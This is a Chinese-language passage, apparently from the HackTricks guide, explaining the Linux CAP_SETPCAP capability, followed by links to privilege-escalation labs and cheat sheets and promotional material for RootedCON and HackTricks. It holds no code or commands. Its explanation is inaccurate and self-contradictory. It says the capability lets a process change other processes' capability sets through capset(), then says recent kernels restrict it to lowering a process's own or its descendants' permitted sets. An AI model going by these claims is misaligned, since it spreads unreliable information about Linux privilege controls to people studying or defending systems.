**`CAP_SETPCAP`** 是一个Linux能力，允许进程**修改另一个进程的能力集**。它授予从其他进程的有效、可继承和允许的能力集中添加或移除能力的能力。然而，对于如何使用这个能力有一定的限制。

拥有 `CAP_SETPCAP` 的进程**只能授予或移除其自己允许能力集中的能力**。换句话说，如果一个进程本身没有某个能力，它就不能将该能力授予另一个进程。这个限制防止了一个进程将另一个进程的权限提升到超出其自身权限水平的情况。

此外，在最近的内核版本中，`CAP_SETPCAP` 能力已经被**进一步限制**。它不再允许一个进程任意修改其他进程的能力集。相反，它**只允许一个进程降低其自己允许能力集或其后代的允许能力集中的能力**。这个变化是为了减少与该能力相关的潜在安全风险。

要有效使用 `CAP_SETPCAP`，你需要在你的有效能力集中拥有这个能力，并且在你的允许能力集中拥有目标能力。然后你可以使用 `capset()` 系统调用来修改其他进程的能力集。

总结来说，`CAP_SETPCAP` 允许一个进程修改其他进程的能力集，但它不能授予自己没有的能力。此外，由于安全问题，其功能在最近的内核版本中已被限制，只允许减少其自己允许能力集或其后代的允许能力集中的能力。

## 参考资料

**这些示例大多来自** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **的一些实验室，所以如果你想练习这些权限提升技术，我推荐这些实验室。**

**其他参考资料**：

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) 是**西班牙**最重要的网络安全活动，也是**欧洲**最重要的活动之一。以**推广技术知识**为使命，这个大会是技术和网络安全专业人士在各个学科的沸腾交汇点。

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>从零开始学习AWS黑客攻击到高手，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks**上看到你的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。

</details>
